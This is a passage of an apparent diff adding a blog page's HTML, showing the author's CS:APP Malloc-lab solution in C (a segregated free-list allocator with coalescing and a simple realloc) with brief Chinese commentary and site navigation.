+    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">4096</span>)  x <span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span>;
+    <span style="color:#66d9ef">else</span>                    x <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>;
+    <span style="color:#66d9ef">return</span> x;
+}
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">insert_node_to_free_list</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>bp, size_t size){
+    size_t list_num <span style="color:#f92672">=</span> size_to_type(size);
+    size_t last_head <span style="color:#f92672">=</span> (size_t)free_lists[list_num];
+    SET_BK(bp, last_head);
+    <span style="color:#66d9ef">if</span> (last_head <span style="color:#f92672">!=</span> NULL) {
+        SET_FD(last_head, bp);
+    }
+    SET_FD(bp, <span style="color:#ae81ff">0</span>);
+    free_lists[list_num] <span style="color:#f92672">=</span> bp;
+    <span style="color:#66d9ef">return</span>;
+}
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">delete_node_from_free_list</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>bp, size_t size) {
+    <span style="color:#66d9ef">if</span> (FD(bp) <span style="color:#f92672">!=</span> NULL)
+        SET_BK(FD(bp), BK(bp));
+    <span style="color:#66d9ef">else</span>
+        free_lists[size_to_type(size)] <span style="color:#f92672">=</span> BK(bp);
+    <span style="color:#66d9ef">if</span> (BK(bp) <span style="color:#f92672">!=</span> NULL)
+        SET_FD(BK(bp), FD(bp));
+    <span style="color:#66d9ef">return</span>;
+}
+</code></pre></div><p>其他函数都需要更改</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* place the block to a free block */</span>
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">place</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>bp, size_t size){
+    size_t origin_size <span style="color:#f92672">=</span> GET_SIZE(HDRP(bp));
+    delete_node_from_free_list(bp, origin_size);
+    <span style="color:#66d9ef">if</span> (origin_size <span style="color:#f92672">-</span> size <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> DSIZE) {
+        PUT(HDRP(bp), PACK(size, <span style="color:#ae81ff">1</span>));
+        PUT(FTRP(bp), PACK(size, <span style="color:#ae81ff">1</span>));
+        size_t remain_size <span style="color:#f92672">=</span> origin_size <span style="color:#f92672">-</span> size;
+        PUT(HDRP(NEXT_BLKP(bp)), PACK(remain_size, <span style="color:#ae81ff">0</span>));
+        PUT(FTRP(NEXT_BLKP(bp)), PACK(remain_size, <span style="color:#ae81ff">0</span>));
+        insert_node_to_free_list(NEXT_BLKP(bp), remain_size);
+    } <span style="color:#66d9ef">else</span> {
+        PUT(HDRP(bp), PACK(origin_size, <span style="color:#ae81ff">1</span>));
+        PUT(FTRP(bp), PACK(origin_size, <span style="color:#ae81ff">1</span>));
+    }
+    <span style="color:#66d9ef">return</span>;
+}
+
+<span style="color:#75715e">/* find a fit free block (first fit) */</span>
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">find_fit</span>(size_t size) {
+    size_t list_num <span style="color:#f92672">=</span> size_to_type(size);
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> list_num; i <span style="color:#f92672">&lt;</span> FREE_LIST_SIZE; <span style="color:#f92672">++</span>i)
+        <span style="color:#66d9ef">if</span> (free_lists[i] <span style="color:#f92672">!=</span> NULL)
+            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> tmp_ptr <span style="color:#f92672">=</span> free_lists[i]; tmp_ptr <span style="color:#f92672">!=</span> NULL; tmp_ptr <span style="color:#f92672">=</span> BK(tmp_ptr))
+                <span style="color:#66d9ef">if</span> (GET_SIZE(HDRP(tmp_ptr)) <span style="color:#f92672">&gt;=</span> size)
+                    <span style="color:#66d9ef">return</span> tmp_ptr;
+    <span style="color:#66d9ef">return</span> NULL;
+}
+
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * coalesce - Coalesce free block next by
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">coalesce</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>bp) {
+    size_t prev_alloc <span style="color:#f92672">=</span> GET_ALLOC(FTRP(PREV_BLKP(bp)));
+    size_t next_alloc <span style="color:#f92672">=</span> GET_ALLOC(HDRP(NEXT_BLKP(bp)));
+    size_t size <span style="color:#f92672">=</span> GET_SIZE(HDRP(bp));
+
+    <span style="color:#66d9ef">if</span> (prev_alloc <span style="color:#f92672">&amp;&amp;</span> next_alloc)
+        <span style="color:#66d9ef">return</span> bp;
+
+    <span style="color:#75715e">/* coalesce with next block */</span>
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>next_alloc <span style="color:#f92672">&amp;&amp;</span> prev_alloc) {
+        size_t next_size <span style="color:#f92672">=</span> GET_SIZE(HDRP(NEXT_BLKP(bp)));
+        delete_node_from_free_list(bp, size);
+        delete_node_from_free_list(NEXT_BLKP(bp), next_size);
+        size <span style="color:#f92672">+=</span> next_size;
+        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span style="color:#ae81ff">0</span>));
+        PUT(HDRP(bp), PACK(size, <span style="color:#ae81ff">0</span>));
+    }
+
+    <span style="color:#75715e">/* coalesce with prev block */</span>
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>prev_alloc <span style="color:#f92672">&amp;&amp;</span> next_alloc) {
+        size_t prev_size <span style="color:#f92672">=</span> GET_SIZE(FTRP(PREV_BLKP(bp)));
+        delete_node_from_free_list(bp, size);
+        delete_node_from_free_list(PREV_BLKP(bp), prev_size);
+        size <span style="color:#f92672">+=</span> prev_size;
+        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span style="color:#ae81ff">0</span>));
+        PUT(FTRP(bp), PACK(size, <span style="color:#ae81ff">0</span>));
+        bp <span style="color:#f92672">=</span> PREV_BLKP(bp);
+    }
+
+    <span style="color:#75715e">/* coalesce with prev and next block */</span>
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>prev_alloc <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>next_alloc) {
+        size_t prev_size <span style="color:#f92672">=</span> GET_SIZE(FTRP(PREV_BLKP(bp)));
+        size_t next_size <span style="color:#f92672">=</span> GET_SIZE(HDRP(NEXT_BLKP(bp)));
+        delete_node_from_free_list(bp, size);
+        delete_node_from_free_list(PREV_BLKP(bp), prev_size);
+        delete_node_from_free_list(NEXT_BLKP(bp), next_size);
+        size <span style="color:#f92672">+=</span> prev_size <span style="color:#f92672">+</span> next_size;
+        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span style="color:#ae81ff">0</span>));
+        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span style="color:#ae81ff">0</span>));
+        bp <span style="color:#f92672">=</span> PREV_BLKP(bp);
+    };
+
+    insert_node_to_free_list(bp, size);
+    <span style="color:#66d9ef">return</span> bp;
+}
+
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * extend_heap - extend heap with a free block
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">extend_heap</span>(size_t words) {
+    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>bp;
+    size_t size;
+    <span style="color:#75715e">/* Allocate and even number of words to maintain alignment */</span>
+    size <span style="color:#f92672">=</span> (words <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">?</span> (words <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> WSIZE : words <span style="color:#f92672">*</span> WSIZE;
+    <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">long</span>)(bp <span style="color:#f92672">=</span> mem_sbrk(size)) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+        <span style="color:#66d9ef">return</span> NULL;
+
+    <span style="color:#75715e">/* Initialize free block header/footer and the epilogue header */</span>
+    PUT(HDRP(bp), PACK(size, <span style="color:#ae81ff">0</span>));
+    PUT(FTRP(bp), PACK(size, <span style="color:#ae81ff">0</span>));
+    insert_node_to_free_list(bp, size);
+    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>));
+
+    <span style="color:#75715e">/* Coalesce if the previous block was free */</span>
+    <span style="color:#66d9ef">return</span> coalesce(bp);
+}
+
+<span style="color:#75715e">/* 
+</span><span style="color:#75715e"> * mm_init - initialize the malloc package.
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">mm_init</span>(<span style="color:#66d9ef">void</span>)
+{
+    <span style="color:#75715e">/* Create the initial empty heap */</span>
+    <span style="color:#66d9ef">if</span> ((heap_listp <span style="color:#f92672">=</span> mem_sbrk(<span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> WSIZE)) <span style="color:#f92672">==</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)   <span style="color:#75715e">/* sbrk() function returns the start address of the new area. */</span>
+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> FREE_LIST_SIZE; <span style="color:#f92672">++</span>i)
+        free_lists[i] <span style="color:#f92672">=</span> NULL;
+    PUT(heap_listp, <span style="color:#ae81ff">0</span>);                                     <span style="color:#75715e">/* Alignment */</span>
+    PUT(heap_listp <span style="color:#f92672">+</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">*</span> WSIZE), PACK(DSIZE, <span style="color:#ae81ff">1</span>));          <span style="color:#75715e">/* Prologue block&#39;s size is 8 and is always alloced */</span>
+    PUT(heap_listp <span style="color:#f92672">+</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> WSIZE), PACK(DSIZE, <span style="color:#ae81ff">1</span>));
+    PUT(heap_listp <span style="color:#f92672">+</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> WSIZE), PACK(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>));              <span style="color:#75715e">/* Epilogue header */</span>
+    heap_listp <span style="color:#f92672">+=</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> WSIZE);
+    
+    <span style="color:#66d9ef">if</span> (extend_heap(CHUNKSIZE<span style="color:#f92672">/</span>WSIZE) <span style="color:#f92672">==</span> NULL)
+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#75715e">/* 
+</span><span style="color:#75715e"> * mm_malloc - Allocate a block by incrementing the brk pointer.
+</span><span style="color:#75715e"> *     Always allocate a block whose size is a multiple of the alignment.
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">mm_malloc</span>(size_t size)
+{
+    <span style="color:#75715e">/* Ignore spurious requests */</span>
+    <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
+        <span style="color:#66d9ef">return</span> NULL;
+    <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&lt;=</span> DSIZE)
+        size <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> DSIZE;
+    size_t newsize <span style="color:#f92672">=</span> size <span style="color:#f92672">+</span> DSIZE <span style="color:#f92672">+</span> ((<span style="color:#f92672">-</span>size) <span style="color:#f92672">%</span> DSIZE);
+    <span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> bp;
+    <span style="color:#75715e">// int newsize = ALIGN(size + SIZE_T_SIZE);
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> ((bp <span style="color:#f92672">=</span> find_fit(newsize)) <span style="color:#f92672">!=</span> NULL) {
+        place(bp, newsize);
+        <span style="color:#66d9ef">return</span> bp;
+    }
+    size_t extendsize <span style="color:#f92672">=</span> MAX(newsize, CHUNKSIZE);
+    <span style="color:#66d9ef">if</span> ((bp <span style="color:#f92672">=</span> extend_heap(extendsize<span style="color:#f92672">/</span>WSIZE)) <span style="color:#f92672">==</span> NULL)
+	   <span style="color:#66d9ef">return</span> NULL;
+    place(bp, newsize);
+    <span style="color:#66d9ef">return</span> bp;
+}
+
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * mm_free - Freeing a block does nothing.
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">mm_free</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ptr)
+{
+    size_t size <span style="color:#f92672">=</span> GET_SIZE(HDRP(ptr));
+
+    PUT(HDRP(ptr), PACK(size, <span style="color:#ae81ff">0</span>));
+    PUT(FTRP(ptr), PACK(size, <span style="color:#ae81ff">0</span>));
+    insert_node_to_free_list(ptr, size);
+    coalesce(ptr);
+}
+</code></pre></div><p>在不优化 realloc 的情况下可以拿到 84 左右的分数，和 next fit 接近</p>
+<p>简单优化一下 realloc，但由于 bug 实在太多，还是选择抄了一个只向后合并空闲块的 realloc（可以增加向前合并，但又得继续 debug，润了）</p>
+<blockquote>
+<p>这里踩到了一个坑，书上给的 extend_heap() 读入的是 words，而很多地方习惯直接给 byte 长度计算的 size 了，所以一直报“未进行复制”的错</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/*
+</span><span style="color:#75715e"> * mm_realloc - Implemented simply in terms of mm_malloc and mm_free
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">mm_realloc</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ptr, size_t size){
+    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>nblock <span style="color:#f92672">=</span> ptr;
+    <span style="color:#66d9ef">int</span> reamin;
+    <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">return</span> NULL;
+    <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&lt;=</span> DSIZE) size <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> DSIZE;
+    <span style="color:#66d9ef">else</span> size <span style="color:#f92672">=</span> ALIGN(size <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>);
+    <span style="color:#66d9ef">if</span> ((reamin <span style="color:#f92672">=</span> GET_SIZE(HDRP(ptr)) <span style="color:#f92672">-</span> size) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>){
+        <span style="color:#66d9ef">return</span> ptr;
+    }
+    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>GET_ALLOC(HDRP(NEXT_BLKP(ptr))) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>GET_SIZE(HDRP(NEXT_BLKP(ptr)))){
+        <span style="color:#66d9ef">if</span> ((reamin <span style="color:#f92672">=</span> GET_SIZE(HDRP(ptr)) <span style="color:#f92672">+</span> GET_SIZE(HDRP(NEXT_BLKP(ptr))) <span style="color:#f92672">-</span> size) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>){
+            <span style="color:#66d9ef">if</span> (extend_heap(MAX(<span style="color:#f92672">-</span>reamin, CHUNKSIZE)<span style="color:#f92672">/</span>WSIZE) <span style="color:#f92672">==</span> NULL)
+                <span style="color:#66d9ef">return</span> NULL;
+            reamin <span style="color:#f92672">+=</span> MAX(<span style="color:#f92672">-</span>reamin, CHUNKSIZE);
+        }
+        delete_node_from_free_list(NEXT_BLKP(ptr), GET_SIZE(HDRP(NEXT_BLKP(ptr))));
+        PUT(HDRP(ptr), PACK(size <span style="color:#f92672">+</span> reamin, <span style="color:#ae81ff">1</span>));
+        PUT(FTRP(ptr), PACK(size <span style="color:#f92672">+</span> reamin, <span style="color:#ae81ff">1</span>));
+    }
+    <span style="color:#66d9ef">else</span>{
+        nblock <span style="color:#f92672">=</span> mm_malloc(size);
+        memcpy(nblock, ptr, GET_SIZE(HDRP(ptr)));
+        mm_free(ptr);
+    }
+    <span style="color:#66d9ef">return</span> nblock;
+}
+</code></pre></div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/system/">System</a>
+        
+            <a href="/tags/reverse/">Reverse</a>
+        
+            <a href="/tags/pwn/">Pwn</a>
+        
+            <a href="/tags/labs/">Labs</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ]
+        });})
+</script>
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/post/hgame2022-writeups/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hgame2022-writeups/cover.45cca8b74c89d3f9ce11dd8491813b9d_hu135499abd96f0998ee1b80004657897f_2075706_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HGAME2022 writeups"
+                        
+                        data-hash="md5-Rcyot0yJ0/nOEd2EkYE7nQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HGAME2022 writeups</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/post/angr-ctf-writeup/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">angr ctf writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/post/qwb2022-rev-writeups/">
+        
+        
+            <div class="article-image">
+                <img src="/post/qwb2022-rev-writeups/cover.857debcd860ee83d948aabfb4115b280_huf3a3154eb771834b8e58d0981851333b_950314_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post qwb 2022 rev writeups"
+                        
+                        data-hash="md5-hX3rzYYO6D2Uiqv7QRWygA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">qwb 2022 rev writeups</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/post/google-ctf-2022-mixed-writeup/">
+        
+        
+            <div class="article-image">
+                <img src="/post/google-ctf-2022-mixed-writeup/cover.9d2e20da231341f69d4c09358a236773_hue95b4dbc0185285c46e601051fa1d00b_430492_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Google CTF 2022 MIXED Writeup"
+                        
+                        data-hash="md5-nS4g2iMTQfadTAk1iiNncw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Google CTF 2022 MIXED Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/post/defcamp2022-can-you-crack-this-wp/">
+        
+        
+            <div class="article-image">
+                <img src="/post/defcamp2022-can-you-crack-this-wp/cover.676f309364fc3173b8b5757c12da83f2_huce52bdd0a85d719a9e95a81ea04327da_778452_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post DefCamp2022 can-you-crack-this Writeup"
+                        
+                        data-hash="md5-Z28wk2T8MXO4tXV8EtqD8g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">DefCamp2022 can-you-crack-this Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2022 s0uthwood&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">Table of contents</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#lab1-data-lab">Lab1 Data-lab</a>
+      <ul>
+        <li><a href="#bitxor">bitXor</a></li>
+        <li><a href="#tmin">tmin</a></li>
+        <li><a href="#istmax">isTmax</a></li>
+        <li><a href="#alloddbits">allOddBits</a></li>
+        <li><a href="#negate">negate</a></li>
+        <li><a href="#isasciidigit">isAsciiDigit</a></li>
+        <li><a href="#conditional">conditional</a></li>
+        <li><a href="#islessorequal">isLessOrEqual</a></li>
+        <li><a href="#logicalneg">logicalNeg</a></li>
+        <li><a href="#howmanybits">howManyBits</a></li>
+        <li><a href="#floatscale2">floatScale2</a></li>
+        <li><a href="#floatfloat2int">floatFloat2Int</a></li>
+        <li><a href="#floatpower2">floatPower2</a></li>
+        <li><a href="#result">result</a></li>
+      </ul>
+    </li>
+    <li><a href="#lab2-bomb-lab">Lab2 Bomb-lab</a>
+      <ul>
+        <li><a href="#phase-1">Phase 1</a></li>
+        <li><a href="#phase-2">Phase 2</a></li>
+        <li><a href="#phase-3">Phase 3</a></li>
+        <li><a href="#phase-4">Phase 4</a></li>
+        <li><a href="#phase-5">Phase 5</a></li>
+        <li><a href="#phase-6">Phase 6</a></li>
+        <li><a href="#secret-phase">Secret Phase</a></li>
+      </ul>
+    </li>
+    <li><a href="#lab3-attack-lab">Lab3 Attack-lab</a>
+      <ul>
+        <li><a href="#phase-1-1">Phase 1</a></li>
+        <li><a href="#phase-2-1">Phase 2</a></li>
+        <li><a href="#phase-3-1">Phase 3</a></li>
+      </ul>
+    </li>
+    <li><a href="#lab4-buffer-lab">Lab4 Buffer-lab</a>
+      <ul>
+        <li><a href="#phase-0">Phase 0</a></li>
+        <li><a href="#phase-1-2">Phase 1</a></li>
+        <li><a href="#phase-2-2">Phase 2</a></li>
+        <li><a href="#phase-3-2">Phase 3</a></li>
+        <li><a href="#phase-4-1">Phase 4</a></li>
+      </ul>
+    </li>
+    <li><a href="#lab5-arch-lab">Lab5 Arch-lab</a>
+      <ul>
+        <li><a href="#part-a">Part A</a></li>
+        <li><a href="#part-b">Part B</a></li>
+      </ul>
+    </li>
+    <li><a href="#lab7-cache-lab">Lab7 Cache-lab</a></li>
+    <li><a href="#lab10-malloc-lab">Lab10 Malloc-lab</a>
+      <ul>
+        <li><a href="#隐式链表">隐式链表</a></li>
+        <li><a href="#分离适配">分离适配</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
